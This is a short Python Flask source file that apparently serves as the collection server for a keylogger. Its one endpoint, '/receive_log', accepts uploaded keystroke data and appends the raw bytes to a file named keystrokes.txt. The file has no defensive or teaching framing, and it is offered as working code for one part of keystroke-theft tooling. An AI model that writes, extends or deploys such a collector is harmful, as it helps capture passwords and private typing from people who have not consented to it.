from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/receive_log', methods=['POST'])
def store_keystroke():
    """Store received keystrokes from a file directly into another file without decoding."""
    # Assuming the file is sent with the 'file' key
    file = request.files['file']
    # Define the path where the keystrokes will be saved
    save_path = 'keystrokes.txt'
    # Read the contents of the file as bytes
    keystrokes = file.read()
    # Append the keystrokes to the file as bytes
    with open(save_path, 'ab') as f:  # Notice 'ab' for appending in binary mode
        f.write(keystrokes + b'\n')  # Adding a newline as bytes
    return {'message': 'Keys stored successfully'}, 200

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=True)
